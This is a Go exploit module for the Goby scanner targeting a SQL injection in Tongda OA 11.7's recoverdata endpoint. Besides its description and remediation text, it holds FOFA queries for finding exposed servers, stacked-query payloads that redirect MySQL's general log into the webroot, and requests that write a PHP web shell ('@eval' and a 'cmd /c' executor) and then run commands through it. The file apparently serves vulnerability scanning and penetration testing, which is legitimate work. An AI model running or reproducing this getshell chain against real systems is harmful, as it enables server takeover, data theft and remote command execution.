package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TongdaOA 11.7 recoverdata method SQL Injection getshell Vulnerability",
    "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>There is a SQL injection vulnerability in the key parameter of the appcenter/appdata/recoverdata method of Tongda OA 11.7. This vulnerability supports stacking and the database permission is not root. An attacker can obtain sensitive database data through the vulnerability. Get server permissions directly.</p>",
    "Product": "TongdaOA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in the key parameter of the appcenter/appdata/recoverdata method of Tongda OA 11.7. This vulnerability supports stacking and the database permission is not root. An attacker can obtain sensitive database data through the vulnerability. Get server permissions directly.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.tongda2000.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "root_path",
            "type": "input",
            "value": "D:/MYOA/webroot",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "aaaa.php",
            "show": ""
        },
        {
            "name": "code",
            "type": "input",
            "value": "echo \"123456\";",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "key[0][formId][0)+and+1%3d{%60%3d'%60%201}+order by 1%23%27]=1&item=1&"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "An internal server error occurred",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "key[0][formId][0)+and+1%3d{%60%3d'%60%201}+order by 100%23%27]=1&item=1&"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "An internal server error occurred",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "key[0][formId][0)+and+1%3d{%60%3d'%60%201} union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32%23%27]=1&item=1&"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "key[0][formId][0)+and+1%3d{%60%3d'%60%201};set global general_log%3doff;set global general_log_file%3d'{{{root_path}}}/{{{filename}}}';%23%27]=1&item=1&"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "An internal server error occurred",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "key[0][formId][0)+and+1%3d{%60%3d'%60%201} union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\"php echo md5(123);$command%3d$_REQUEST%5b8%255d;$exec%3d$wsh->exec(\\\"cmd /c\\\".$command);$stdout%3d$exec->StdOut();$stroutput%3d$stdout->ReadAll();echo $stroutput;echo md5(123);unlink(__FILE__);\\r\\n?>\",20,21,22,23,24,25,26,27,28,29,30,31,32%23%27]=1&item=1&"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "key[0][formId][0)+and+1%3d{%60%3d'%60%201};set global general_log%3doff;%23%27]=1&item=1&"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "An internal server error occurred",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/{{{filename}}}",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "8={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "Command Execution"
    ],
    "VulType": [
        "SQL Injection",
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "通达oa 11.7 recoverdata 方法root堆叠注入getshell漏洞",
            "Product": "通达oa",
            "Description": "<p>通达OA办公系统是由<span style=\"color: rgb(62, 62, 62);\">北京通达信科科技有限公司开发的一款<span style=\"color: rgb(62, 62, 62);\">简洁实用的协同办公OA系统。</span></span></p><p><font color=\"#3e3e3e\">通达OA 11.7版本的appcenter/appdata/recoverdata方法的key参数存在SQL注入漏洞，此漏洞支持堆叠，且数据库权限未root，攻击者可以通过漏洞获取数据库敏感数据，在获取到安装路径的条件下，可以直接获取服务器权限。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至11.x或者12.x最新版（2017未修复）：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">通达OA 11.7版本的appcenter/appdata/</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">recoverdata方法</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">的key参数存在SQL注入漏洞，此漏洞支持堆叠，且数据库权限未root，攻击者可以通过漏洞获取数据库敏感数据，在获取到安装路径的条件下，可以直接获取服务器权限。</span><br></p>",
            "VulType": [
                "命令执行",
                "SQL注入"
            ],
            "Tags": [
                "命令执行",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "TongdaOA 11.7 recoverdata method SQL Injection getshell Vulnerability",
            "Product": "TongdaOA",
            "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>There is a SQL injection vulnerability in the key parameter of the appcenter/appdata/recoverdata method of Tongda OA 11.7. This vulnerability supports stacking and the database permission is not root. An attacker can obtain sensitive database data through the vulnerability. Get server permissions directly.<br></p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is a SQL injection vulnerability in the key parameter of the appcenter/appdata/recoverdata method of Tongda OA 11.7. This vulnerability supports stacking and the database permission is not root. An attacker can obtain sensitive database data through the vulnerability. Get server permissions directly.<br></p>",
            "VulType": [
                "SQL Injection",
                "Command Execution"
            ],
            "Tags": [
                "SQL Injection",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10699"
}`

	start_log234123 := func(u *httpclient.FixUrl){
		uri1 := "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint"
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg1.Data = "key[0][formId][0)+and+1%3d{%60%3d'%60%201};set global general_log%3don;%23%27]=1"
		if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil{}
	}

	bin_hex234123 := func(str string) string {
		bName := []byte(str)
		hName := hex.EncodeToString(bName)
		return hName
	}

	change_log_file234123 := func(u *httpclient.FixUrl, root_path string, filename string){
		root_path = strings.Replace(root_path, "\\", "/", -1)
		fullname := root_path + "/" + filename
		payload := "set global general_log_file='"+fullname+"'"
		hex_data := bin_hex234123(payload)
		full_poc := "set @z%3d0x"+hex_data+";prepare c from @z;EXECUTE c;DEALLOCATE PREPARE c;"
		uri1 := "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint"
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg1.Data = "key[0][formId][0)+and+1%3d{%60%3d'%60%201};"+full_poc+"%23%27]=1"
		if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil{}
	}

	select_shell234123 := func(u *httpclient.FixUrl){
		uri1 := "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint"
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//添加删除自身语句
		cfg1.Data = "key[0][formId][0)+and+1%3d{%60%3d'%60%201} union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\"\r\n<?php \r\necho md5(123);\r\n@eval(end($_REQUEST));\r\necho md5(123);unlink(__FILE__);\r\n?>\",20,21,22,23,24,25,26,27,28,29,30,31,32%23%27]=1"
		if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil{}

	}

	stop_log234123 := func(u *httpclient.FixUrl){
		uri1 := "/general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint"
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg1.Data = "key[0][formId][0)+and+1%3d{%60%3d'%60%201};set global general_log%3doff;%23%27]=1"
		if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil{}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			code := url.QueryEscape(ss.Params["code"].(string))
			filename := ss.Params["filename"].(string)
			root_path := ss.Params["root_path"].(string)
			cfg := httpclient.NewGetRequestConfig("/"+filename+"?img=" + code)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			change_log_file234123(expResult.HostInfo,root_path,filename)
			start_log234123(expResult.HostInfo)
			select_shell234123(expResult.HostInfo)
			stop_log234123(expResult.HostInfo)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				reg := regexp.MustCompile(`202cb962ac59075b964b07152d234b70([\w\W]+)202cb962ac59075b964b07152d234b70`)
				coreName := reg.FindStringSubmatch(resp.Utf8Html)
				if len(coreName) != 0 {
					expResult.Success = true
					expResult.Output = coreName[1]
				}
			}
			return expResult
		},
	))
}